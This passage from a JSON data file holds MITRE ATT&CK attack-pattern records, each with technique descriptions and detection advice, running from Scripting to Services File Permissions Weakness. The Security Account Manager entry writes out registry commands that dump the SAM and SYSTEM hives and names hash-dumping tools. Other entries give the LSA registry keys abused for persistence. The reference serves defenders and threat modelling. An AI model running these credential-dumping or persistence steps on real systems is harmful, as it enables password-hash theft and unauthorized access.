Documents\",\"url\":\"https://www.uperesia.com/analyzing-malicious-office-documents\"}],\"id\":\"attack-pattern--7fd87010-3a00-4da3-b905-410525e8ec44\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-03-30T13:39:24.852Z\",\"name\":\"Scripting\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"revoked\":false,\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"File monitoring\",\"Process command-line parameters\"],\"x_mitre_defense_bypassed\":[\"Process whitelisting\",\"Data Execution Prevention\",\"Exploit Prevention\"],\"x_mitre_deprecated\":true,\"x_mitre_detection\":\"Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\\n\\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.\\n\\nAnalyze Office file attachments for potentially malicious macros. Execution of macros may create suspicious process trees depending on what the macro is designed to do. Office processes, such as winword.exe, spawning instances of cmd.exe, script application like wscript.exe or powershell.exe, or other suspicious processes may indicate malicious activity. (Citation: Uperesia Malicious Office Documents)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T18:42:07.281Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\\n\\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\\n\\n* pwdumpx.exe\\n* [gsecdump](https://attack.mitre.org/software/S0008)\\n* [Mimikatz](https://attack.mitre.org/software/S0002)\\n* secretsdump.py\\n\\nAlternatively, the SAM can be extracted from the Registry with Reg:\\n\\n* <code>reg save HKLM\\\\sam sam</code>\\n* <code>reg save HKLM\\\\system system</code>\\n\\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)\\n\\nNotes: \\n* RID 500 account is the local, built-in administrator.\\n* RID 501 is the guest account.\\n* User accounts start with a RID of 1,000+.\\n\",\"external_references\":[{\"external_id\":\"T1003.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1003/002\"},{\"description\":\"Flathers, R. (2018, February 19). creddump7. Retrieved April 11, 2018.\",\"source_name\":\"GitHub Creddump7\",\"url\":\"https://github.com/Neohapsis/creddump7\"}],\"id\":\"attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-25T15:17:30.640Z\",\"name\":\"Security Account Manager\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Ed Williams, Trustwave, SpiderLabs\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"PowerShell logs\",\"Process monitoring\"],\"x_mitre_detection\":\"Hash dumpers open the Security Accounts Manager (SAM) on the local file system (<code>%SystemRoot%/system32/config/SAM</code>) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:51.330Z\",\"external_references\":[{\"external_id\":\"T1063\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1063\"}],\"id\":\"attack-pattern--241814ae-de3f-4656-b49e-f9a80764d4b7\",\"modified\":\"2020-02-21T21:17:03.347Z\",\"name\":\"Security Software Discovery\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-21T21:16:18.066Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\\n\\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.(Citation: Expel IO Evil in AWS)\",\"external_references\":[{\"external_id\":\"T1518.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1518/001\"},{\"description\":\"Anthony Randazzo, Britton Manahan and Sam Lipton. (2020, April 28). Finding Evil in AWS. Retrieved June 25, 2020.\",\"source_name\":\"Expel IO Evil in AWS\",\"url\":\"https://expel.io/blog/finding-evil-in-aws/\"}],\"id\":\"attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-06-29T17:32:24.787Z\",\"name\":\"Security Software Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Stackdriver logs\",\"Azure activity logs\",\"AWS CloudTrail logs\",\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\\n\\nIn cloud environments, additionally monitor logs for the usage of APIs that may be used to gather information about security software configurations within the environment.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\",\"Office 365\",\"Azure AD\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:13.447Z\",\"external_references\":[{\"external_id\":\"T1101\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1101\"},{\"description\":\"Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.\",\"source_name\":\"Graeber 2014\",\"url\":\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\"},{\"description\":\"Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved June 24, 2015.\",\"source_name\":\"Microsoft Configure LSA\",\"url\":\"https://technet.microsoft.com/en-us/library/dn408187.aspx\"}],\"id\":\"attack-pattern--6c174520-beea-43d9-aac6-28fb77f3e446\",\"modified\":\"2020-01-24T17:35:47.598Z\",\"name\":\"Security Support Provider\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T17:16:11.806Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user\'s Domain password or smart card PINs.\\n\\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\Security Packages</code> and <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\OSConfig\\\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\",\"external_references\":[{\"external_id\":\"T1547.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1547/005\"},{\"description\":\"Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.\",\"source_name\":\"Graeber 2014\",\"url\":\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\"},{\"description\":\"Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved June 24, 2015.\",\"source_name\":\"Microsoft Configure LSA\",\"url\":\"https://technet.microsoft.com/en-us/library/dn408187.aspx\"}],\"id\":\"attack-pattern--5095a853-299c-4876-abd7-ac0050fb5462\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-25T15:42:48.910Z\",\"name\":\"Security Support Provider\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"DLL monitoring\",\"Windows Registry\",\"Loaded DLLs\"],\"x_mitre_detection\":\"Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\LSASS.exe</code> with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1167\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1167\"},{\"description\":\"Juuso Salonen. (2012, September 5). Breaking into the OS X keychain. Retrieved July 15, 2017.\",\"source_name\":\"OS X Keychain\",\"url\":\"http://juusosalonen.com/post/30923743427/breaking-into-the-os-x-keychain\"},{\"description\":\"Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to DA, the OS X Way. Retrieved July 3, 2017.\",\"source_name\":\"External to DA, the OS X Way\",\"url\":\"http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way\"},{\"description\":\"Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.\",\"source_name\":\"OSX Keydnap malware\",\"url\":\"https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/\"}],\"id\":\"attack-pattern--2715c335-1bf2-4efe-9f18-0691317ff83b\",\"modified\":\"2020-02-12T18:56:59.153Z\",\"name\":\"Securityd Memory\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-12T18:56:31.051Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain) (Citation: OSX Keydnap malware)\\n\\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. (Citation: OS X Keychain) (Citation: External to DA, the OS X Way) Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)\",\"external_references\":[{\"external_id\":\"T1555.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1555/002\"},{\"description\":\"Juuso Salonen. (2012, September 5). Breaking into the OS X keychain. Retrieved July 15, 2017.\",\"source_name\":\"OS X Keychain\",\"url\":\"http://juusosalonen.com/post/30923743427/breaking-into-the-os-x-keychain\"},{\"description\":\"Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.\",\"source_name\":\"OSX Keydnap malware\",\"url\":\"https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/\"},{\"description\":\"Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to DA, the OS X Way. Retrieved July 3, 2017.\",\"source_name\":\"External to DA, the OS X Way\",\"url\":\"http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way\"}],\"id\":\"attack-pattern--1a80d097-54df-41d8-9d33-34e755ec5e72\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-02-17T13:16:53.850Z\",\"name\":\"Securityd Memory\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments for activity surrounded users searching for credentials or using automated tools to scan memory for passwords.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"root\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-06-28T17:52:07.296Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.\",\"external_references\":[{\"external_id\":\"T1505\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1505\"},{\"description\":\"US-CERT. (2015, November 13). Compromised Web Servers and Web Shells - Threat Awareness and Guidance. Retrieved June 8, 2016.\",\"source_name\":\"US-CERT Alert TA15-314A Web Shells\",\"url\":\"https://www.us-cert.gov/ncas/alerts/TA15-314A\"}],\"id\":\"attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-04-17T17:47:57.075Z\",\"name\":\"Server Software Component\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Netflow/Enclave netflow\",\"Process monitoring\",\"File monitoring\",\"Application logs\"],\"x_mitre_detection\":\"Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.\\n\\nProcess monitoring may be used to detect servers components that perform suspicious actions such as running cmd.exe or accessing files. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells) \",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\",\"root\"],\"x_mitre_platforms\":[\"Windows\",\"Linux\",\"macOS\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-05-31T21:30:36.550Z\",\"external_references\":[{\"external_id\":\"T1035\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1035\"}],\"id\":\"attack-pattern--f44731de-ea9f-406d-9b83-30ecbb9b4392\",\"modified\":\"2020-03-10T18:34:39.665Z\",\"name\":\"Service Execution\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-10T18:33:36.159Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).\\n\\n[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals)\\n\\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.\",\"external_references\":[{\"external_id\":\"T1569.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1569/002\"},{\"description\":\"Microsoft. (2018, May 31). Service Control Manager. Retrieved March 28, 2020.\",\"source_name\":\"Microsoft Service Control Manager\",\"url\":\"https://docs.microsoft.com/windows/win32/services/service-control-manager\"},{\"description\":\"Russinovich, M. (2014, May 2). Windows Sysinternals PsExec v2.11. Retrieved May 13, 2015.\",\"source_name\":\"Russinovich Sysinternals\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx\"}],\"id\":\"attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-03-28T18:52:02.384Z\",\"name\":\"Service Execution\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows Registry\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Changes to service Registry entries and command line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [PsExec](https://attack.mitre.org/software/S0029).\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_remote_support\":true,\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-20T15:31:43.613Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may target the different network services provided by systems to conduct a DoS. Adversaries often target DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\\n\\nOne example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)\\n\\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)\",\"external_references\":[{\"external_id\":\"T1499.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1499/002\"},{\"description\":\"Philippe Alcoy, Steinthor Bjarnason, Paul Bowen, C.F. Chui, Kirill Kasavchnko, and Gary Sockrider of Netscout Arbor. (2018, January). Insight into the Global Threat Landscape - Netscout Arbor\'s 13th Annual Worldwide Infrastructure Security Report. Retrieved April 22, 2019.\",\"source_name\":\"Arbor AnnualDoSreport Jan 2018\",\"url\":\"https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf\"},{\"description\":\"Cloudflare. (n.d.). What is an HTTP flood DDoS attack?. Retrieved April 22, 2019.\",\"source_name\":\"Cloudflare HTTPflood\",\"url\":\"https://www.cloudflare.com/learning/ddos/http-flood-ddos-attack/\"},{\"description\":\"ASERT Team, Netscout Arbor. (2012, April 24). DDoS Attacks on SSL: Something Old, Something New. Retrieved April 22, 2019.\",\"source_name\":\"Arbor SSLDoS April 2012\",\"url\":\"https://www.netscout.com/blog/asert/ddos-attacks-ssl-something-old-something-new\"},{\"description\":\"Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow. Retrieved April 25, 2019.\",\"source_name\":\"Cisco DoSdetectNetflow\",\"url\":\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf\"}],\"id\":\"attack-pattern--38eb0c22-6caf-46ce-8869-5964bd735858\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-29T01:52:53.947Z\",\"name\":\"Service Exhaustion Flood\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Netflow/Enclave netflow\",\"Network device logs\",\"Network intrusion detection system\",\"Web application firewall logs\",\"Web logs\",\"SSL/TLS inspection\"],\"x_mitre_detection\":\"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\\n\\nIn addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.\\n\\nExternally monitor the availability of services that may be targeted by an Endpoint DoS.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\",\"Office 365\",\"Azure AD\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:49.119Z\",\"external_references\":[{\"external_id\":\"T1058\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1058\"},{\"external_id\":\"CAPEC-478\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/478.html\"},{\"description\":\"Microsoft. (n.d.). Registry Key Security and Access Rights. Retrieved March 16, 2017.\",\"source_name\":\"MSDN Registry Key Security\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms724878.aspx\"},{\"description\":\"Hull, D. (2014, May 3). Kansa: Service related collectors and analysis. Retrieved October 10, 2019.\",\"source_name\":\"TrustedSignal Service Failure\",\"url\":\"https://trustedsignal.blogspot.com/2014/05/kansa-service-related-collectors-and.html\"},{\"description\":\"The Cyber (@r0wdy_). (2017, November 30). Service Recovery Parameters. Retrieved April 9, 2018.\",\"source_name\":\"Twitter Service Recovery Nov 2017\",\"url\":\"https://twitter.com/r0wdy_/status/936365549553991680\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427\",\"modified\":\"2020-03-19T15:12:13.034Z\",\"name\":\"Service Registry Permissions Weakness\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2019-03-29T19:00:55.901Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services can inhibit or stop response to an incident or aid in the adversary\'s overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \\n\\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services may not allow for modification of their data stores while running. Adversaries may stop services in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)\",\"external_references\":[{\"external_id\":\"T1489\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1489\"},{\"description\":\"Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer Takes Aim At Winter Olympics. Retrieved March 14, 2019.\",\"source_name\":\"Talos Olympic Destroyer 2018\",\"url\":\"https://blog.talosintelligence.com/2018/02/olympic-destroyer.html\"},{\"description\":\"Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Unraveling the Long Thread of the Sony Attack. Retrieved February 25, 2016.\",\"source_name\":\"Novetta Blockbuster\",\"url\":\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf\"},{\"description\":\"Counter Threat Unit Research Team. (2017, May 18). WCry Ransomware Analysis. Retrieved March 26, 2019.\",\"source_name\":\"SecureWorks WannaCry Analysis\",\"url\":\"https://www.secureworks.com/research/wcry-ransomware-analysis\"}],\"id\":\"attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2019-07-18T19:18:32.674Z\",\"name\":\"Service Stop\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"Windows Registry\",\"API monitoring\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments to see if critical processes are terminated or stop running.\\n\\nMonitor Registry edits for modifications to services and startup programs that correspond to services of high importance. Look for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services</code>.\\n\\nAlterations to the service binary path or the service startup type changed to disabled may be suspicious.\\n\\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. For example, <code>ChangeServiceConfigW</code> may be used by an adversary to prevent services from starting.(Citation: Talos Olympic Destroyer 2018)\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-12T20:43:53.998Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\\n\\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\",\"external_references\":[{\"external_id\":\"T1574.010\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1574/010\"},{\"external_id\":\"CAPEC-CAPEC\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/CAPEC.html\"}],\"id\":\"attack-pattern--9e8b28c9-35fe-48ac-a14d-e6cc032dcbcd\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-26T19:37:28.912Z\",\"name\":\"Services File Permissions Weakness\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Travis Smith, Tripwire\",\"Stefan Kanthak\"],\"x_mitre_data_sources\":[\"Process 